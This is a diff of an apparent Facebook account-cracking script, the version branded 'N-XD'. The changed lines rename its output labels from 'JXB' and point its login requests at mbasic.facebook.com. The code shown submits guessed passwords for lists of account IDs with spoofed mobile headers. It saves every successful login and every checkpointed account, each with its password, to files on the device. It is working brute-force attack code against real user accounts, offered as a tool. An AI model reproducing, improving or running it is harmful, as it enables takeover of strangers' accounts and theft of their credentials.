@@ -28,7 +28,7 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python JXB.py')
+	os.system('python n-xd.py')
 android_models=[]
 try:
 	xx = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/sm.txt').text.splitlines()
@@ -252,7 +252,7 @@ def public():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python JXB.py')
+		os.system('python n-xd.py')
 	except requests.exceptions.ConnectionError:
 		exit(f' No internet connection')
 	except (KeyError,IOError):
@@ -325,7 +325,7 @@ def auto_file(cookies,access_token):
     for el in range(sl):
         sid = input(f' Put {el+1} link: ')
         os.system('cat .txt | grep "'+sid+'" > .temp.txt')
-    print('\n \033[1;35m /sdcard/JXB.txt \033[0;97m\n')
+    print('\n \033[1;35m /sdcard/N-XD.txt \033[0;97m\n')
     sf = input(' Put path to save file: ')
     file = open('.temp.txt','r').read().splitlines()
     print('')
@@ -736,13 +736,13 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [JXB-OK] %s | %s'%(ids,pas))
+				print('\r\r\033[1;32m [N-XD-OK] %s | %s'%(ids,pas))
 				open('/sdcard/N-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[38;5;208m [N-XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/N-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
@@ -853,7 +853,7 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
+			header_freefb = {'authority':'mbasic.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'en-US,en;q=0.8',
@@ -867,7 +867,7 @@ def rcrack(ids,passlist):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -887,7 +887,7 @@ def rcrack(ids,passlist):
 				uid = coki[24:39]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[38;5;208m [N-XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/N-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
@@ -1019,5 +1019,4 @@ except requests.exceptions.ConnectionError:
 	exit()
 except:exit()
   
-
 
